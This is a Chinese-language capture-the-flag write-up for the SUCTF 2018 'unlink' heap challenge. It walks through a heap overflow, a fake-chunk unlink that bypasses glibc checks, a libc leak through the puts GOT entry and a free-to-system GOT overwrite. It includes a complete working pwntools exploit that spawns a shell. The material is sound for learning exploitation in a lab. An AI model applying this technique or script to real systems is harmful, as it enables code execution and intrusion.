# 题目：unlink任意分配chunk

题目地址：[[SUCTF 2018 招新赛\]unlink | NSSCTF](https://www.nssctf.cn/problem/2334)

## 思路：

1. 利用unlink前提，必须要有一个位置存储了chunkP的地址（本题时heaplist中存储了），才能基于此构造来绕过检测。
1. 构造unlink，实现heaplist指针修改，再编辑实现任意地址读写。

## 分析：

1. touch函数，size足够大，chunk不能超过11个：

   ![image-20240713143617347](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131436412.png)

2. delete函数，heap指针清0，没有UAF漏洞：

   ![image-20240713143708871](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131437933.png)

3. show函数，结合delete函数，所以不存在UAF漏洞：

   ![image-20240713143737663](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131437714.png)

4. edit函数，存在堆溢出：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132040131.png)

## 利用：

1. buf的位置存着heap指针，可以基于此构造unlink：

   ![image-20240713205229172](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132052353.png)

   检查：

   ![image-20240713205258769](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132052829.png)

   确定：

   * fd=fakeDF_addr=buf-0x18(绕过第一个检查)，
   * bk=fakeBK_addr=buf-0x10(绕过第二个检查)。
   * 最后FakeBK->fd 即 *(fakeBK_addr+0x10)=fakeDF_addr=buf-0x18（因为写入的地址是同一处，所以第一次写入fakeBK地址会被覆盖）。：

   ```python
   buf = 0x6020C0
   add(0x20)   #0 用来构造unlink
   add(0x80)   #1 用来触发unlink 
   add(0x10)   #2 切割开top chunk ，防止合并
   
   prev_size = p64(0)
   size = p64(0x20)
   
   fd = buf-0x18   #fakeDF_addr
   bk = buf-0x10   #fakeBK_addr
   content = p64(fd)+p64(bk)
   of_prve_size = p64(0x20)	#构造的chunkP的大小，prev_size在前一个chunk空闲时存放其大小（包括头）
   of_chunk_size = p64(0x90)	#在释放free(1)时向下合并，触发对chunkP的unlink，
   
   payload0 = prev_size + size + content + of_prve_size + of_chunk_size
   edit(0,payload0)
   ```

   绕过检测：

   ![image-20240713210902993](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132109190.png)

2. free(1)触发unlink，向buf[0]写入fd值：

   ```python
   free(1)
   ```

   ![image-20240713211302394](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132113641.png)

3. 继续控制buf[1]:

   ```python
   #用buf[0]地址，覆盖heaplist0，进而能往buf[0]上写入数据，此后即可任意地址读写数据（buf[1]作为跳板写入任意地址）自此buf[1]变成傀儡
   payload0 = p64(0)*3 + p64(0x6020c8)
   edit(0,payload0)
   ```

   ![image-20240713212017702](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132120806.png)

4. 覆盖buf[1]指向puts函数的got表，进而**泄漏puts函数的地址和libc基地址**：

   ```python
   #往0x6020c8即buf[1]写puts函数的got表地址
   payload0 = p64(elf.got["puts"])
   edit(0,payload0)
   
   show(1)
   p.recv()
   puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("puts_addr==>"+hex(puts_addr))
   
   libc_base = puts_addr-libc.symbols["puts"]
   success("libc_addr==>"+hex(libc_base))
   
   system_addr = libc_base+libc.sym["system"]
   success("system_addr==>"+hex(system_addr))
   ```

   ![image-20240713212245582](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132122774.png)

5. 继续控制buf[1]，往free函数的got表写入system函数地址：

   ```python
   #先传地址
   payload0 = p64(elf.got["free"])
   edit(0,payload0)
   #再覆盖free函数的got表
   payload1 = p64(system_addr)
   edit(1,payload1)
   ```

   ![image-20240713212607125](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132126568.png)

6. 最后构造一个system("/bin/sh") 就能拿到shell：

   ```python
   edit(2,b"/bin/sh\x00")
   free(2)
   ```

7. 完整EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   # p = remote("node4.anna.nssctf.cn",28460)
   p = process("./pwn")
   libc = ELF('./libc-2.23.so')
   elf = ELF("./pwn")
   
   
   def add(size):
       p.sendlineafter(b':','1')
       p.sendlineafter(b':',str(size))
       # p.sendlineafter(b':',content)
   
   def edit(index, content):
       p.sendlineafter(b':','4')
       p.sendlineafter(b':',str(index).encode())
       # p.sendlineafter(':',str(len(content)))
       p.sendafter(b'content',content)
   
   def show(index):
       p.sendlineafter(b':',b'3')
       p.sendlineafter(b'show',str(index).encode())
   
   def free(index):
       p.sendlineafter(b':','2')
       p.sendlineafter(b'delete',str(index).encode())
   
   buf = 0x6020C0
   add(0x20)   #0 用来构造unlink
   add(0x80)   #1 用来触发unlink 
   add(0x10)   #2 切割开top chunk ，防止合并
   
   prev_size = p64(0)
   size = p64(0x20)
   
   fd = buf-0x18   #下一个chunk的地址
   bk = buf-0x10   #上一个chunk的地址
   content = p64(fd)+p64(bk)
   of_prve_size = p64(0x20)
   of_chunk_size = p64(0x90)
   
   payload0 = prev_size + size + content + of_prve_size + of_chunk_size
   edit(0,payload0)
   
   free(1)
   
   #覆盖heaplist0
   payload0 = p64(0)*3 + p64(0x6020c8)
   edit(0,payload0)
   
   #利用覆盖heaplist0，往0x6020c8写puts函数的got表地址
   payload0 = p64(elf.got["puts"])
   edit(0,payload0)
   
   show(1)
   p.recv()
   puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("puts_addr==>"+hex(puts_addr))
   
   libc_base = puts_addr-libc.symbols["puts"]
   success("libc_addr==>"+hex(libc_base))
   
   system_addr = libc_base+libc.sym["system"]
   success("system_addr==>"+hex(system_addr))
   
   payload0 = p64(elf.got["free"])
   edit(0,payload0)
   
   payload1 = p64(system_addr)
   edit(1,payload1)
   
   edit(2,b"/bin/sh\x00")
   free(2)
   
   p.sendline(b"cat flag")
   p.interactive()
   ```

   成功拿到flag

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132131097.png)

